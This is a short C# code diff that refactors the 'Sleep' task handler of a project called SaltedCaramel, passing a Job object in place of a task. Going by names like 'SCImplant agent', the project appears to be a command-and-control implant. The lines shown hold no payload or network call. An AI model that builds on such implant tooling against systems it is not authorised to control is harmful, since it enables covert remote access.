@@ -3,13 +3,15 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Diagnostics;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
     class Sleep
     {
-        public static void Execute(SCTask task, SCImplant agent)
+        public static void Execute(Job job, SCImplant agent)
         {
+            SCTask task = job.Task;
             try
             {
                 int sleep = Convert.ToInt32(task.@params);
